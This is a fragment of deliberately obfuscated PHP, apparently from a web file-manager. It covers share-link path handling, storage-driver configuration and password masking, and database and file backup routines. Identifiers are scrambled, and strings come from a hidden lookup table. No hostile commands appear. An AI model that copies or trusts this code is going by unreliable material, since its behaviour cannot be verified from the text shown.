$ÄĞ—“ŒÈ = rtrim($this->pathParse[$õ Åí”¼[486]][$õ Åí”¼[1174]], $õ Åí”¼[8]); foreach ($òû¹¸„Û as &$£±¤é) { $£±¤é[$õ Åí”¼[84]] = $this->pathDriver . $õ Åí”¼[8] . ltrim(substr($£±¤é[$õ Åí”¼[84]], strlen($ÄĞ—“ŒÈ)), $õ Åí”¼[8]); } unset($£±¤é); return $òû¹¸„Û; } public function listAllSimple($¯±‰Óò², $ÊÑàèüÍ = false) { $Œ–Ëö½ß =& $_SERVER[ì™ı‰º¯]; $‹å…şÒ = $this->listAll($¯±‰Óò²); $‰Ççù¡˜ = $this->pathParse[$Œ–Ëö½ß[421]]; if (trim($‰Ççù¡˜, $Œ–Ëö½ß[8]) == trim(get_path_father($‰Ççù¡˜), $Œ–Ëö½ß[8])) { $ÊÑàèüÍ = !0; } return IO::init($Œ–Ëö½ß[12])->listAllSimpleMake($‹å…şÒ, $‰Ççù¡˜, $ÊÑàèüÍ); } public function getPathOuter($²”¹¹®) { $ŞÉü«¬® =& $_SERVER[ì™ı‰º¯]; $àëŸæ = KodIO::parse($²”¹¹®); if ($àëŸæ[$ŞÉü«¬®[33]] == KodIO::KOD_SHARE_ITEM) { return $àëŸæ[$ŞÉü«¬®[84]]; } $·¬áÛŞ = KodIO::clear($²”¹¹®); $§—İ‚­û = KodIO::clear($this->pathParse[$ŞÉü«¬®[486]][$ŞÉü«¬®[1174]]); $äóùº’ = substr($·¬áÛŞ, strlen($§—İ‚­û)); if (substr($·¬áÛŞ, 0, strlen($§—İ‚­û)) != $§—İ‚­û) { return !1; } return $this->pathParse[$ŞÉü«¬®[1168]] . $ŞÉü«¬®[8] . ltrim($äóùº’, $ŞÉü«¬®[8]); } public function getType() { $á½÷“À¡ =& $_SERVER[ì™ı‰º¯]; $€á¾€Î = str_replace($á½÷“À¡[74], $á½÷“À¡[12], get_class($this)); return strtolower($€á¾€Î); } public function isTypeObject($ƒÏá…†) { return IO::isTypeObject($ƒÏá…†); } public function info($®ºî§Ğä) { return $this->infoParse($®ºî§Ğä); } public function infoAuth($½ÚøÁÉ„) { return $this->infoParse($½ÚøÁÉ„); } public function infoWithChildren($Ò«Ê”) { return $this->infoParse($Ò«Ê”, !0); } public function infoFull($É“Ù½×À) { return $this->infoParse($É“Ù½×À); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ˆ«şœ´ª) { $this->pathParse = $ˆ«şœ´ª; } protected function infoParse($–Ôçè¸, $Ä‘¤¡—Ô = false) { $ÓÖ®œû =& $_SERVER[ì™ı‰º¯]; return Action($ÓÖ®œû[1173])->sharePathInfo($this->pathParse[$ÓÖ®œû[84]], !0, $Ä‘¤¡—Ô); } public function listPath($õ´ËğÃ×, $œ®âñáÓ = false) { $²·‹Å³ğ =& $_SERVER[ì™ı‰º¯]; $Í„Ñèø» = IO::listPath($õ´ËğÃ×, $œ®âñáÓ); if (!$Í„Ñèø») { return $Í„Ñèø»; } if (is_array($Í„Ñèø»[$²·‹Å³ğ[1347]])) { $¦Æó²•– = Action($²·‹Å³ğ[1356])->parsePathChildren($Í„Ñèø»[$²·‹Å³ğ[1347]], array($²·‹Å³ğ[421] => $õ´ËğÃ×)); $Í„Ñèø»[$²·‹Å³ğ[1347]] = Action($²·‹Å³ğ[1173])->shareItemInfo($¦Æó²•–); } foreach ($Í„Ñèø» as $ ¨–ªˆ¡ => $ô°çæ­) { if (!in_array($ ¨–ªˆ¡, array($²·‹Å³ğ[83], $²·‹Å³ğ[82]))) { continue; } foreach ($ô°çæ­ as $Â–àŒóå => $¦Æó²•–) { $¦Æó²•– = Action($²·‹Å³ğ[1356])->parsePathChildren($¦Æó²•–, array($²·‹Å³ğ[421] => $õ´ËğÃ×)); $Í„Ñèø»[$ ¨–ªˆ¡][$Â–àŒóå] = Action($²·‹Å³ğ[1173])->shareItemInfo($¦Æó²•–); } } return $Í„Ñèø»; } } goto C’©˜Š°ª¦; A¯ÍÃêÒê„: class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\155\56\163\x6f\x75\x72\143\x65\x53\145\143\162\145\164\114\151\x73\x74"; public $field = array("\x73\x6f\165\162\x63\145\111\x44", "\x74\x79\160\x65\111\x44", "\143\162\145\141\x74\x65\125\x73\x65\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\x2e\163\164\157\162\x61\x67\145\114\x69\x73\164"; public $field = array("\156\x61\x6d\145", "\163\x69\x7a\145\x4d\x61\170", "\163\171\163\164\x65\x6d", "\x64\145\x66\x61\x75\154\164", "\x64\162\151\166\x65\x72", "\x63\x6f\156\146\x69\x67"); public function listData($æ ®°¼Û = false, $¢¶åª¨Á = "\x6d\x6f\144\151\146\171\124\151\155\145", $Ì„»Ó·· = false) { $©¹÷Î =& $_SERVER[ì™ı‰º¯]; $€³³ê®“ = parent::listData($æ ®°¼Û, $¢¶åª¨Á, $Ì„»Ó··); if ($æ ®°¼Û) { return $€³³ê®“; } $¢×øØÁ˜ = $this->ioSizeUseGet(array_to_keyvalue($€³³ê®“, $©¹÷Î[12], $©¹÷Î[399])); foreach ($€³³ê®“ as $íÑ”’Òª => $¢àåÛûÇ) { unset($€³³ê®“[$íÑ”’Òª][$©¹÷Î[6]]); $€³³ê®“[$íÑ”’Òª][$©¹÷Î[1848]] = isset($¢×øØÁ˜[$¢àåÛûÇ[$©¹÷Î[399]]]) ? $¢×øØÁ˜[$¢àåÛûÇ[$©¹÷Î[399]]] : 0; } return $€³³ê®“; } public function ioSizeUseGet($™ÆµÒ©ï) { $¦âèÅÁ =& $_SERVER[ì™ı‰º¯]; if (!$™ÆµÒ©ï) { return array(); } $ÜÒ÷¿Ë = $¦âèÅÁ[2175] . implode($¦âèÅÁ[50], $™ÆµÒ©ï); $ôò“Ü»û = Cache::get($ÜÒ÷¿Ë); if ($ôò“Ü»û) { return $ôò“Ü»û; } $ÂË‹ùË¼ = array($¦âèÅÁ[813] => $¦âèÅÁ[399], $¦âèÅÁ[2176] => $¦âèÅÁ[76]); $èÓ—çÕ· = array($¦âèÅÁ[813] => array($¦âèÅÁ[7], $™ÆµÒ©ï)); $ôò“Ü»û = Model($¦âèÅÁ[785])->field($ÂË‹ùË¼)->where($èÓ—çÕ·)->group($¦âèÅÁ[813])->select(); $ôò“Ü»û = array_to_keyvalue($ôò“Ü»û, $¦âèÅÁ[399], $¦âèÅÁ[76]); Cache::set($ÜÒ÷¿Ë, $ôò“Ü»û, 600); return $ôò“Ü»û; } public function getConfig($î îæù¹) { $ “ÉğÉı = parent::listData($î îæù¹); return json_decode($ “ÉğÉı[$_SERVER[ì™ı‰º¯][6]], !0); } public function update($‰ÙÚ—„Ë, $æáÒˆ¦–) { $£ó«ÉÚ =& $_SERVER[ì™ı‰º¯]; $„Æ“´á‰ = $æáÒˆ¦–[$£ó«ÉÚ[32]]; $Ô®ıĞø = array_to_keyvalue(parent::listData(), $£ó«ÉÚ[32]); if (isset($Ô®ıĞø[$„Æ“´á‰]) && $Ô®ıĞø[$„Æ“´á‰][$£ó«ÉÚ[399]] != $‰ÙÚ—„Ë) { return !1; } $this->checkPwd($‰ÙÚ—„Ë, $æáÒˆ¦–); if (isset($æáÒˆ¦–[$£ó«ÉÚ[2177]]) && $æáÒˆ¦–[$£ó«ÉÚ[2177]] == $£ó«ÉÚ[88]) { $this->checkConfig($æáÒˆ¦–); } unset($æáÒˆ¦–[$£ó«ÉÚ[2177]]); $Û¤õÁƒ = parent::update($‰ÙÚ—„Ë, $æáÒˆ¦–); if ($Û¤õÁƒ && $æáÒˆ¦–[$£ó«ÉÚ[37]]) { $—ºƒ«å« = 0; foreach ($Ô®ıĞø as $±ˆ•¥ıÜ) { if ($±ˆ•¥ıÜ[$£ó«ÉÚ[37]] && $±ˆ•¥ıÜ[$£ó«ÉÚ[399]] != $‰ÙÚ—„Ë) { $—ºƒ«å« = $±ˆ•¥ıÜ[$£ó«ÉÚ[399]]; parent::update($±ˆ•¥ıÜ[$£ó«ÉÚ[399]], array($£ó«ÉÚ[37] => 0)); } } $this->updateBackup($‰ÙÚ—„Ë, $—ºƒ«å«); } return $Û¤õÁƒ; } public function add($œ£œĞ») { $¶™èÂ“ =& $_SERVER[ì™ı‰º¯]; $ÅÜ×‘Ø = array_to_keyvalue(parent::listData(), $¶™èÂ“[32]); if (isset($ÅÜ×‘Ø[$œ£œĞ»[$¶™èÂ“[32]]])) { return !1; } $this->checkConfig($œ£œĞ»); $ûß¶ûùÑ = parent::insert($œ£œĞ»); if ($ûß¶ûùÑ && $œ£œĞ»[$¶™èÂ“[37]]) { foreach ($ÅÜ×‘Ø as $ø«È²ˆ…) { if ($ø«È²ˆ…[$¶™èÂ“[37]]) { parent::update($ø«È²ˆ…[$¶™èÂ“[399]], array($¶™èÂ“[37] => 0)); } } } return $ûß¶ûùÑ; } public function updateBackup($íÀï‡ı¶, $æ÷¿¿÷) { $±ğÚ¢„“ =& $_SERVER[ì™ı‰º¯]; if (!$æ÷¿¿÷) { return; } $¤Çó¹ÎŠ = Model($±ğÚ¢„“[744])->config(); if ($¤Çó¹ÎŠ[$±ğÚ¢„“[1640]] != $±ğÚ¢„“[88] || $¤Çó¹ÎŠ[$±ğÚ¢„“[747]] != $æ÷¿¿÷) { return; } $ŠÏ„ºµƒ = Model($±ğÚ¢„“[766])->get($±ğÚ¢„“[776]); $ŠÏ„ºµƒ = json_decode($ŠÏ„ºµƒ, !0); if (!$ŠÏ„ºµƒ) { return; } $ŠÏ„ºµƒ[$±ğÚ¢„“[747]] = $íÀï‡ı¶; Model($±ğÚ¢„“[766])->set(array($±ğÚ¢„“[776] => $ŠÏ„ºµƒ)); } public function checkPwd($ªˆŠ­ö, &$÷ª¬´á) { $ÌâÃ³ôÉ =& $_SERVER[ì™ı‰º¯]; if (empty($÷ª¬´á[$ÌâÃ³ôÉ[6]])) { return; } $Œ©ãŒşê = json_decode($÷ª¬´á[$ÌâÃ³ôÉ[6]], !0); $Ë¹¥ô„’ = $ÌâÃ³ôÉ[12]; $æ¦ßû° = array($ÌâÃ³ôÉ[2178], $ÌâÃ³ôÉ[2179], $ÌâÃ³ôÉ[888]); foreach ($æ¦ßû° as $¡ÃÒô“¶) { if (isset($Œ©ãŒşê[$¡ÃÒô“¶])) { $Ë¹¥ô„’ = $¡ÃÒô“¶; break; } } if (!$Ë¹¥ô„’) { return; } $Ÿ’Ïô££ = $this->getConfig($ªˆŠ­ö); $ë†Õêş­ = $Ÿ’Ïô££[$Ë¹¥ô„’]; $›€‰Òì§ = $Œ©ãŒşê[$Ë¹¥ô„’]; if ($›€‰Òì§ == str_repeat($ÌâÃ³ôÉ[189], strlen($ë†Õêş­))) { $Œ©ãŒşê[$Ë¹¥ô„’] = $ë†Õêş­; $÷ª¬´á[$ÌâÃ³ôÉ[6]] = json_encode($Œ©ãŒşê); } else { if ($›€‰Òì§ != $ë†Õêş­) { $÷ª¬´á[$ÌâÃ³ôÉ[2177]] = $ÌâÃ³ôÉ[88]; } } } public function checkConfig(&$ª«œñ‘‡, $ú£‡ö¡Ä = false) { $·´ùî¦™ =& $_SERVER[ì™ı‰º¯]; $À©´½ˆû = strtolower($ª«œñ‘‡[$·´ùî¦™[95]]); $×—§‹‰ò = json_decode($ª«œñ‘‡[$·´ùî¦™[6]], !0); foreach ($×—§‹‰ò as $»ƒ€©ğË => $í¦œ±Ôæ) { $×—§‹‰ò[$»ƒ€©ğË] = trim($í¦œ±Ôæ); } $×—§‹‰ò[$·´ùî¦™[2180]] = rand_string(6); $œÀ©Ñ—™ = $GLOBALS[$·´ùî¦™[6]][$·´ùî¦™[89]][$·´ùî¦™[822]]; $ î†ÃÛ = isset($œÀ©Ñ—™[$À©´½ˆû]) ? $œÀ©Ñ—™[$À©´½ˆû] : ucfirst($À©´½ˆû); $Õ‡°ÀÌ­ = $·´ùî¦™[74] . $ î†ÃÛ; if (!$ î†ÃÛ || !class_exists($Õ‡°ÀÌ­)) { if ($ú£‡ö¡Ä) { return LNG($·´ùî¦™[2181]); } write_log(array($·´ùî¦™[2182], $ª«œñ‘‡, get_caller_info()), $·´ùî¦™[2183]); show_json(LNG($·´ùî¦™[2181]), !1, $ª«œñ‘‡); } $ä²¼âñØ = new $Õ‡°ÀÌ­($×—§‹‰ò); if (in_array($À©´½ˆû, $ä²¼âñØ->objectDriver)) { if (!$ä²¼âñØ->isBucketCors() && !$ä²¼âñØ->setBucketCors()) { $ÍıšÏıà = LNG($·´ùî¦™[2184]); $ÍıšÏıà .= $·´ùî¦™[2185] . LNG($·´ùî¦™[2186]); if ($ú£‡ö¡Ä) { return $ÍıšÏıà; } show_json($ÍıšÏıà, !1); } } $Àü¸›š£ = rtrim($×—§‹‰ò[$·´ùî¦™[1179]], $·´ùî¦™[8]) . $·´ùî¦™[8]; $¤Ûâ–“Ğ = $ä²¼âñØ->getPath($Àü¸›š£ . $·´ùî¦™[1183]); if (!$ä²¼âñØ->mkfile($¤Ûâ–“Ğ)) { if ($ú£‡ö¡Ä) { return LNG($·´ùî¦™[2184]); } show_json(LNG($·´ùî¦™[2184]), !1); } $×—§‹‰ò[$·´ùî¦™[1179]] = $Àü¸›š£; $ª«œñ‘‡[$·´ùî¦™[6]] = json_encode($×—§‹‰ò); $ª«œñ‘‡[$·´ùî¦™[95]] = $ î†ÃÛ; return !0; } public function driverListSystem() { $ÁŸ¢Ş¢Ñ =& $_SERVER[ì™ı‰º¯]; $»ÅÈš = parent::listData(); $¤èÕÁ´Ã = array(); foreach ($»ÅÈš as $É§ñ¤òÙ) { unset($É§ñ¤òÙ[$ÁŸ¢Ş¢Ñ[201]], $É§ñ¤òÙ[$ÁŸ¢Ş¢Ñ[85]]); $É§ñ¤òÙ[$ÁŸ¢Ş¢Ñ[6]] = json_decode($É§ñ¤òÙ[$ÁŸ¢Ş¢Ñ[6]], !0); $¤èÕÁ´Ã[] = $É§ñ¤òÙ; } return $¤èÕÁ´Ã; } public function defaultDriver() { $šıİ—ˆæ =& $_SERVER[ì™ı‰º¯]; $ŞŸ†â«‚ = parent::listData(); $¹ÏÀÅïé = array_filter_by_field($ŞŸ†â«‚, $šıİ—ˆæ[37], 1); $¹ÏÀÅïé = $¹ÏÀÅïé[0]; if ($¹ÏÀÅïé) { $¹ÏÀÅïé[$šıİ—ˆæ[6]] = json_decode($¹ÏÀÅïé[$šıİ—ˆæ[6]], !0); } return $¹ÏÀÅïé; } public function driverInfo($Ö»’) { $ÓŠğŸşÃ =& $_SERVER[ì™ı‰º¯]; $°ÃûÈó£ = array_to_keyvalue(parent::listData(), $ÓŠğŸşÃ[399]); if (!isset($°ÃûÈó£[$Ö»’])) { return !1; } $Ï—àêĞÆ = $°ÃûÈó£[$Ö»’]; $Ï—àêĞÆ[$ÓŠğŸşÃ[6]] = json_decode($Ï—àêĞÆ[$ÓŠğŸşÃ[6]], !0); return $Ï—àêĞÆ; } public function remove($µŞâä‘²) { $this->removeShareItems($µŞâä‘²); return parent::remove($µŞâä‘²); } public function removeWithFile($÷Ôºññ, $•±õ´™Á) { $‰‘ù°ìç =& $_SERVER[ì™ı‰º¯]; $ùñ“«Ã = array($‰‘ù°ìç[813] => $÷Ôºññ); $ƒ‘’‚á¬ = Model($‰‘ù°ìç[471])->where($ùñ“«Ã)->count(); $¦ÀíÈÌÏ = Model($‰‘ù°ìç[471])->where($ùñ“«Ã)->sum($‰‘ù°ìç[76]); $”Ó¿ñïÍ = $•±õ´™Á . $‰‘ù°ìç[2187] . $÷Ôºññ; $ä–ßµõı = LNG($•±õ´™Á == $‰‘ù°ìç[548] ? $‰‘ù°ìç[2188] : $‰‘ù°ìç[2189]); $ç½‚Ì˜Ó = new TaskFileTransfer($”Ó¿ñïÍ, $‰‘ù°ìç[2183], $ƒ‘’‚á¬, $ä–ßµõı . "\x28{$÷Ôºññ}\x29"); $ç½‚Ì˜Ó->task[$‰‘ù°ìç[759]] = (double) $¦ÀíÈÌÏ; $‰×¹¨Æ = KodIO::defaultDriver(); $–åæşõ– = $‰×¹¨Æ[$‰‘ù°ìç[399]]; $ÁœÒ®ğÓ = "\173\x69\x6f\72{$–åæşõ–}\x7d\57"; $›ö•ùÔÕ = !0; $Ö°¼ïÇŠ = array(); $§°²÷†Ğ = Model($‰‘ù°ìç[200])->where($ùñ“«Ã)->field($‰‘ù°ìç[2190])->select(); foreach ($§°²÷†Ğ as $İêØ·Öç) { $îöÅÛÀÖ = $İêØ·Öç[$‰‘ù°ìç[84]]; $®ÓÙŞÑÀ = $ÁœÒ®ğÓ . str_replace("\x7b\x69\x6f\72{$÷Ôºññ}\175\x2f", $‰‘ù°ìç[12], $îöÅÛÀÖ); if (!IO::exist($îöÅÛÀÖ)) { $Ö°¼ïÇŠ[] = $İêØ·Öç[$‰‘ù°ìç[468]]; $ç½‚Ì˜Ó->updateFileEnd($İêØ·Öç[$‰‘ù°ìç[32]], $İêØ·Öç[$‰‘ù°ìç[76]]); continue; } if (IO::exist($®ÓÙŞÑÀ)) { $ç½‚Ì˜Ó->updateFileEnd($İêØ·Öç[$‰‘ù°ìç[32]], $İêØ·Öç[$‰‘ù°ìç[76]]); continue; } if (!IO::move($îöÅÛÀÖ, get_path_father($®ÓÙŞÑÀ))) { $›ö•ùÔÕ = !1; break; } $ùñ“«Ã = array($‰‘ù°ìç[468] => $İêØ·Öç[$‰‘ù°ìç[468]]); $¹ğã÷¦Ã = array($‰‘ù°ìç[813] => $–åæşõ–, $‰‘ù°ìç[84] => $®ÓÙŞÑÀ); Model($‰‘ù°ìç[200])->where($ùñ“«Ã)->save($¹ğã÷¦Ã); } $this->removeByFileID($Ö°¼ïÇŠ); if (!$›ö•ùÔÕ) { $ç½‚Ì˜Ó->stop($”Ó¿ñïÍ); return !1; } $ç½‚Ì˜Ó->end(); if ($•±õ´™Á == $‰‘ù°ìç[1828]) { $this->remove($÷Ôºññ); } } public function progress($áËŒô·Š, $¿Ä¦›¦ò) { return Task::get($¿Ä¦›¦ò . $_SERVER[ì™ı‰º¯][2187] . $áËŒô·Š); } private function removeByFileID($ÖÑÑàêº = array()) { $©›—Æüš =& $_SERVER[ì™ı‰º¯]; if (empty($ÖÑÑàêº)) { return; } $ƒéëòÕØ = array($©›—Æüš[468] => array($©›—Æüš[7], $ÖÑÑàêº)); $ÈÙÇİè¹ = Model($©›—Æüš[1338])->where($ƒéëòÕØ)->field($©›—Æüš[402])->select(); if (!$ÈÙÇİè¹) { return; } $ÈÙÇİè¹ = array_to_keyvalue($ÈÙÇİè¹, $©›—Æüš[12], $©›—Æüš[402]); foreach ($ÈÙÇİè¹ as $ÚÊ¦ñíÉ) { Model($©›—Æüš[416])->removeNow($ÚÊ¦ñíÉ, !1); } } private function removeShareItems($Å´ÎîİŒ) { $ıñŞÔ =& $_SERVER[ì™ı‰º¯]; $­„£®î = "\173\x69\x6f\72{$Å´ÎîİŒ}\x7d\x2f"; $…Â³Æóœ = array($ıñŞÔ[402] => 0, $ıñŞÔ[1174] => array($ıñŞÔ[383], "{$­„£®î}\45")); $…ûº¬ã” = Model($ıñŞÔ[1839])->where($…Â³Æóœ)->field($ıñŞÔ[593])->select(); if (empty($…ûº¬ã”)) { return; } $à€êºÑ = array_to_keyvalue($…ûº¬ã”, $ıñŞÔ[12], $ıñŞÔ[593]); Model($ıñŞÔ[592])->remove($à€êºÑ); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\x65\x6d\x2e\114\x69\x67\x68\x74\101\x70\160"; public $modelType = "\123\x79\x73\x74\x65\155\117\160\164\x69\157\156"; public $field = array("\156\141\x6d\145", "\x67\162\157\x75\160", "\144\145\163\143", "\x63\x6f\x6e\x74\x65\156\x74"); public function listData($ ¾ğ€Ãô = false, $ ©èï•É = "\x6d\x6f\144\151\146\171\124\x69\x6d\145", $ÎÇƒ¦ÍÜ = true) { return parent::listData($ ¾ğ€Ãô, $ ©èï•É, $ÎÇƒ¦ÍÜ); } public function remove($€«ô„ø–) { $ìŞè»ù‘ = $this->findByName($€«ô„ø–); if (!$ìŞè»ù‘) { return !1; } return parent::remove($ìŞè»ù‘[$_SERVER[ì™ı‰º¯][399]]); } public function add($ıÒÔÓ®ğ) { if ($this->findByName($ıÒÔÓ®ğ[$_SERVER[ì™ı‰º¯][32]])) { return !1; } return parent::insert($ıÒÔÓ®ğ); } public function update($¢ŞÔ³¦‡, $¤Ï¶ïˆ™) { $öÀÃÍ‰› =& $_SERVER[ì™ı‰º¯]; $àí§¹úã = $this->findByName($¢ŞÔ³¦‡); $ºŞÍÎ´Û = $this->findByName($¤Ï¶ïˆ™[$öÀÃÍ‰›[32]]); if (!$àí§¹úã || $ºŞÍÎ´Û && $ºŞÍÎ´Û[$öÀÃÍ‰›[399]] != $àí§¹úã[$öÀÃÍ‰›[399]]) { return !1; } return parent::update($àí§¹úã[$öÀÃÍ‰›[399]], $¤Ï¶ïˆ™); } } goto EªÌ²ôÕô; EŒÊ¢¶ÈÇº: class BackupDbFile { public function __construct() { } public function index() { $˜ÑÚêÄ =& $_SERVER[ì™ı‰º¯]; $ÀÔÂÚ‡– = Backup::get(); $Ã¿Ï²´· = $ÀÔÂÚ‡–[$˜ÑÚêÄ[32]]; $óË½äçË = $this->tmpFilesPath() . "\x62\x61\143\x6b\165\x70\137{$Ã¿Ï²´·}\57"; $ÎşÒëñÖ = $this->backupPath($ÀÔÂÚ‡–); if (!($ÎşÒëñÖ = IO::mkdir($ÎşÒëñÖ))) { return !1; } $ñÊ‰…ø = IO::listPath($óË½äçË); $Ïƒá±¢ = isset($ñÊ‰…ø[$˜ÑÚêÄ[83]]) ? $ñÊ‰…ø[$˜ÑÚêÄ[83]] : array(); $•ÕÕÏ‡÷ = array_sum(array_column($Ïƒá±¢, $˜ÑÚêÄ[76])); if (!$•ÕÕÏ‡÷) { return !1; } $ÎŒì”ïÏ = array($˜ÑÚêÄ[794] => $•ÕÕÏ‡÷, $˜ÑÚêÄ[795] => time()); Backup::set($ÎŒì”ïÏ); $æ­š¸¿Ñ = new TaskFileTransfer($˜ÑÚêÄ[796], $˜ÑÚêÄ[776], count($Ïƒá±¢), LNG($˜ÑÚêÄ[777]) . $˜ÑÚêÄ[386] . LNG($˜ÑÚêÄ[779]) . $˜ÑÚêÄ[797]); $æ­š¸¿Ñ->task[$˜ÑÚêÄ[759]] = $•ÕÕÏ‡÷; foreach ($ñÊ‰…ø[$˜ÑÚêÄ[83]] as $­ÉÙ€½û) { $¯ö¡‹ŸĞ = IO::move($­ÉÙ€½û[$˜ÑÚêÄ[84]], $ÎşÒëñÖ); if (!$¯ö¡‹ŸĞ) { $æ­š¸¿Ñ->end(); $éÇ•Æ˜Ô = IO::getLastError($˜ÑÚêÄ[798] . $­ÉÙ€½û[$˜ÑÚêÄ[84]] . $˜ÑÚêÄ[799] . $ÎşÒëñÖ . $˜ÑÚêÄ[164]); write_log($éÇ•Æ˜Ô, $˜ÑÚêÄ[776]); return !1; } } $µÌ¦Ïşº = new DbManage(); $Œ˜¾Ê·£ = $µÌ¦Ïşº->getSqlFile(); if (!$Œ˜¾Ê·£[$˜ÑÚêÄ[800]] || !$Œ˜¾Ê·£[$˜ÑÚêÄ[13]]) { return !1; } IO::move($Œ˜¾Ê·£[$˜ÑÚêÄ[800]], $ÎşÒëñÖ); IO::move($Œ˜¾Ê·£[$˜ÑÚêÄ[13]], $ÎşÒëñÖ); $æ­š¸¿Ñ->end(); $ÎŒì”ïÏ = array($˜ÑÚêÄ[801] => $•ÕÕÏ‡÷, $˜ÑÚêÄ[802] => time()); Backup::set($ÎŒì”ïÏ); return !0; } private function backupPath($Òƒ§ûî×) { $ë÷½¼ñë =& $_SERVER[ì™ı‰º¯]; $ıª¥£­› = $Òƒ§ûî×[$ë÷½¼ñë[32]]; $Î¯œŠİ‚ = Model($ë÷½¼ñë[766])->get($ë÷½¼ñë[767]); $…ò‚è¸€ = substr(md5($ë÷½¼ñë[768] . $Î¯œŠİ‚ . $ıª¥£­›), 0, 8); return "\173\x69\x6f\x3a{$Òƒ§ûî×[$ë÷½¼ñë[747]]}\x7d\x2f\x64\x61\164\x61\x62\x61\163\145\x2f\x62\x61\143\x6b\165\160\57" . $ıª¥£­› . $ë÷½¼ñë[11] . $…ò‚è¸€; } private function tmpFilesPath() { $ıÔª²…Ü =& $_SERVER[ì™ı‰º¯]; $™˜ıµ‰ = TEMP_FILES; if ($GLOBALS[$ıÔª²…Ü[6]][$ıÔª²…Ü[89]][$ıÔª²…Ü[792]]) { $™˜ıµ‰ = $GLOBALS[$ıÔª²…Ü[6]][$ıÔª²…Ü[89]][$ıÔª²…Ü[792]]; if (!mk_dir($™˜ıµ‰) || !is_writable($™˜ıµ‰) || !IO::mkfile($™˜ıµ‰ . $ıÔª²…Ü[793])) { $™˜ıµ‰ = TEMP_FILES; } } return $™˜ıµ‰; } } class BackupFile { public function __construct() { } public function index() { $–ƒøØ = Backup::get(); $µ‡ÌËĞ´ = $–ƒøØ[$_SERVER[ì™ı‰º¯][293]][$_SERVER[ì™ı‰º¯][200]][$_SERVER[ì™ı‰º¯][468]]; $€®Ò áª = array($_SERVER[ì™ı‰º¯][469] => array($_SERVER[ì™ı‰º¯][803], $µ‡ÌËĞ´), $_SERVER[ì™ı‰º¯][804] => array($_SERVER[ì™ı‰º¯][331], $–ƒøØ[$_SERVER[ì™ı‰º¯][747]])); $’ıŒ§ß = (int) Model($_SERVER[ì™ı‰º¯][785])->where($€®Ò áª)->count($_SERVER[ì™ı‰º¯][468]); $±Á·œÓ­ = (int) Model($_SERVER[ì™ı‰º¯][785])->where($€®Ò áª)->sum($_SERVER[ì™ı‰º¯][76]); $š€Œ´àÆ = new TaskFileTransfer($_SERVER[ì™ı‰º¯][805], $_SERVER[ì™ı‰º¯][776], $’ıŒ§ß, LNG($_SERVER[ì™ı‰º¯][777]) . $_SERVER[ì™ı‰º¯][778] . LNG($_SERVER[ì™ı‰º¯][806])); $š€Œ´àÆ->task[$_SERVER[ì™ı‰º¯][759]] = $±Á·œÓ­; $ºÉ±‰ã = array($_SERVER[ì™ı‰º¯][807] => $’ıŒ§ß, $_SERVER[ì™ı‰º¯][808] => $±Á·œÓ­, $_SERVER[ì™ı‰º¯][809] => time()); Backup::set($ºÉ±‰ã); $§€ÁÊ = !0; $ß¿½Ÿô = $this->storeIds(); $è§˜»šœ = 1; $—óãÎô¡ = 1000; $æîÎ¦ = $¢€´â½ó = 0; $é ÛÑíÙ = array(); $¯Å€˜£Ò = $ÊÒ£í¥ù = 0; do { $İ©¿ÈÉ = $_SERVER[ì™ı‰º¯][810]; $¦Ç•÷¼ê = Model($_SERVER[ì™ı‰º¯][785])->where($€®Ò áª)->field($İ©¿ÈÉ)->order($_SERVER[ì™ı‰º¯][811])->selectPage($—óãÎô¡, $è§˜»šœ); $òÍ–øĞ = !empty($¦Ç•÷¼ê[$_SERVER[ì™ı‰º¯][369]]) ? $¦Ç•÷¼ê[$_SERVER[ì™ı‰º¯][369]] : array(); foreach ($òÍ–øĞ as $ì¼ü­í) { if (!$this->_fileExist($ì¼ü­í, $é ÛÑíÙ, $ß¿½Ÿô)) { $’ıŒ§ß -= 1; $±Á·œÓ­ -= (int) $ì¼ü­í[$_SERVER[ì™ı‰º¯][76]]; write_log("\x66\x69\154\x65\40\156\157\164\40\x65\170\151\x73\x74\56\146\x69\x6c\145\111\x44\x3a{$ì¼ü­í[$_SERVER[ì™ı‰º¯][468]]}\54\x20\160\141\164\150\72{$ì¼ü­í[$_SERVER[ì™ı‰º¯][84]]}", $_SERVER[ì™ı‰º¯][812]); continue; } $¿¯“Ù•¾ = $ì¼ü­í[$_SERVER[ì™ı‰º¯][84]]; $¿»¿³ú¼ = "\x7b\x69\x6f\x3a{$–ƒøØ[$_SERVER[ì™ı‰º¯][747]]}\x7d" . substr($¿¯“Ù•¾, strlen("\x7b\151\157\x3a{$ì¼ü­í[$_SERVER[ì™ı‰º¯][813]]}\x7d")); if (IO::exist($¿»¿³ú¼)) { $š€Œ´àÆ->updateFileEnd($ì¼ü­í[$_SERVER[ì™ı‰º¯][32]], $ì¼ü­í[$_SERVER[ì™ı‰º¯][76]]); } else { $¿»¿³ú¼ = get_path_father($¿»¿³ú¼); IO::mkdir($¿»¿³ú¼); if (!IO::copy($¿¯“Ù•¾, $¿»¿³ú¼, $_SERVER[ì™ı‰º¯][814])) { write_log($_SERVER[ì™ı‰º¯][815] . $¿¯“Ù•¾ . $_SERVER[ì™ı‰º¯][799] . $¿»¿³ú¼ . $_SERVER[ì™ı‰º¯][164], $_SERVER[ì™ı‰º¯][776]); $§€ÁÊ = !1; break; } } $µ‡ÌËĞ´ = $ì¼ü­í[$_SERVER[ì™ı‰º¯][468]]; $¢€´â½ó += 1; $æîÎ¦ += $ì¼ü­í[$_SERVER[ì™ı‰º¯][76]]; $ÊÒ£í¥ù += 1; $¯Å€˜£Ò += $ì¼ü­í[$_SERVER[ì™ı‰º¯][76]]; if ($æîÎ¦ >= 1024 * 1024 * 100) { $ºÉ±‰ã = array($_SERVER[ì™ı‰º¯][816] => $µ‡ÌËĞ´, $_SERVER[ì™ı‰º¯][817] => $ÊÒ£í¥ù, $_SERVER[ì™ı‰º¯][818] => $¯Å€˜£Ò); Backup::set($ºÉ±‰ã); $æîÎ¦ = $¢€´â½ó = 0; } } $¬ñò¯£„ = count($òÍ–øĞ); $è§˜»šœ++; } while ($¬ñò¯£„ == $—óãÎô¡); $š€Œ´àÆ->end(); $ºÉ±‰ã = array($_SERVER[ì™ı‰º¯][819] => 1, $_SERVER[ì™ı‰º¯][757] => time(), $_SERVER[ì™ı‰º¯][771] => 1, 